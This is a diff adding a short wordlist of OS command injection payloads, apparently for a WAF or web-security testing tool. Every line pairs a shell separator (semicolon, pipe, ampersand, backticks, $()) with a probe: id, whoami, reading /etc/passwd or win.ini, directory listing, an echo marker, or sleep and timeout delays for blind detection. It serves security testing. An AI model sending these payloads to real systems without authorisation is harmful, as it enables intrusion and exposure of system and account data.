@@ -1,0 +1,25 @@
+;id
+|id
+||id
+&id
+`id`
+$(id)
+; cat /etc/passwd
+| cat /etc/passwd
+; whoami
+| whoami
+& ipconfig
+| ipconfig
+; type C:\Windows\win.ini
+| type C:\Windows\win.ini
+& dir
+| dir
+; echo WAFMAP_CMDI_SUCCESS
+| echo WAFMAP_CMDI_SUCCESS
+& echo WAFMAP_CMDI_SUCCESS
+; sleep 5
+| sleep 5
+|| sleep 5
+& sleep 5
+; timeout 5
+| timeout 5
